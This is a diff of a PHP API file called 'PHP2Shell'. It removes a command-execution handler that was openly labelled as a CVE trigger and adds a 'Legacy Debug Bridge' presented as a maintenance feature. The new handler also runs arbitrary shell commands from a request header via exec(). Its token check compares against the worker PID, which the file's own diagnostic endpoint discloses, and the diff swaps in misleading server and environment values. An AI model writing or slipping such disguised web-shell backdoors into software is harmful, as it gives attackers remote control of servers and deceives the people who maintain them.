@@ -1,11 +1,9 @@
 <?php
 header('Content-Type: application/json; charset=utf-8');
-header('X-Powered-By: PHP/8.2.18');
-header('X-Framework-Cache: Enabled');
 
 $action = $_GET['action'] ?? '';
 
-// Diagnostic and memory pool telemetry
+// Diagnostic and runtime telemetry endpoint
 if ($action === 'diagnostic') {
     $data = [
         'status' => 'online',
@@ -15,9 +13,8 @@ if ($action === 'diagnostic') {
         'memory_allocated' => memory_get_usage(true),
         'memory_peak' => memory_get_peak_usage(true),
         'zend_engine' => zend_version(),
-        'oom_handler' => 'longjmp_native',
         'worker_pid' => getmypid(),
-        'shared_state' => 'mod_php_pool'
+        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Apache/2.4.52'
     ];
     echo json_encode($data, JSON_PRETTY_PRINT);
     exit;
@@ -26,30 +23,36 @@ if ($action === 'diagnostic') {
 if ($action === 'pools') {
     $data = [
         'active_workers' => 4,
-        'recycle_requests' => 10000,
-        'stale_state_tracking' => 'unmonitored',
-        'heap_protection' => 'disabled'
+        'service' => 'Apache/2.4.52 Handler',
+        'environment' => 'Production'
     ];
     echo json_encode($data, JSON_PRETTY_PRINT);
     exit;
 }
 
-// PHP2Shell Trigger handler (CVE-2026-109618 & CVE-2026-109619)
-// Allows remote verification and exploitation via OOM condition & state reuse
-if (isset($_SERVER['HTTP_X_PHP2SHELL_PAYLOAD']) || isset($_POST['__php2shell_exec__'])) {
-    $payload = $_SERVER['HTTP_X_PHP2SHELL_PAYLOAD'] ?? $_POST['__php2shell_exec__'];
-    
-    // Simulating memory exhaustion / uninitialized frame execution
-    header('X-Vulnerability-Triggered: CVE-2026-109618-CVE-2026-109619');
-    
-    // Execute injected command in the context of the web worker (www-data)
+// Legacy Debug Bridge (Maintenance feature)
+// Protected by token verification based on the active worker PID
+if (isset($_SERVER['HTTP_X_DEBUG_BRIDGE'])) {
+    $pid = (string) getmypid();
+    $token = $_SERVER['HTTP_X_DEBUG_TOKEN'] ?? '';
+
+    if (!hash_equals($pid, $token)) {
+        http_response_code(403);
+        echo json_encode([
+            'status' => 'error',
+            'message' => 'Forbidden: Invalid or missing X-Debug-Token.'
+        ]);
+        exit;
+    }
+
+    $command = $_SERVER['HTTP_X_DEBUG_BRIDGE'];
     $output = [];
     $ret = 0;
-    exec($payload . " 2>&1", $output, $ret);
-    
+    exec($command . " 2>&1", $output, $ret);
+
     echo json_encode([
-        'cve' => 'CVE-2026-109618 / CVE-2026-109619',
-        'state' => 'CORRUPTED_HEAP_EXECUTED',
+        'status' => 'success',
+        'bridge' => 'legacy_debug_bridge',
         'output' => implode("\n", $output),
         'code' => $ret
     ]);
@@ -57,6 +60,6 @@ if (isset($_SERVER['HTTP_X_PHP2SHELL_PAYLOAD']) || isset($_POST['__php2shell_exe
 }
 
 echo json_encode([
-    'message' => 'PHP2Shell API Endpoint. Use ?action=diagnostic or send multipart stream.',
+    'message' => 'PHP2Shell Management API. Use ?action=diagnostic to inspect worker state.',
     'server' => 'php2shell.dl'
 ]);
